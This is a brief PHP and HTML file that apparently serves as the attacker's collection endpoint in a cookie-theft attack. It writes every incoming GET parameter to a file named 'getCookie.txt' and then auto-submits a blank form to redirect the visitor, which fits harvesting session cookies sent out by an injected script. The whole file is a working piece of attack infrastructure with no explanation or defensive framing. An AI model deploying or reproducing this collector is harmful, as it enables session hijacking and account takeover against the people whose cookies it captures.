<?php
	$myfile = "getCookie.txt";
	$myfile = fopen("$myfile", "a");
	if (isset($_GET))
	{
		$objData = serialize($_GET);
		fwrite($myfile, $objData . PHP_EOL);
	}
	fclose($myfile);
?>
<html>
	<head>
	</head>
	<body>
	</body>
<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
<script>
	$(document).ready(function() {
		var form = $('<form action="/" method="post"></form>');
		$('body').append(form);
		form.submit();
	});
</script>
</html>
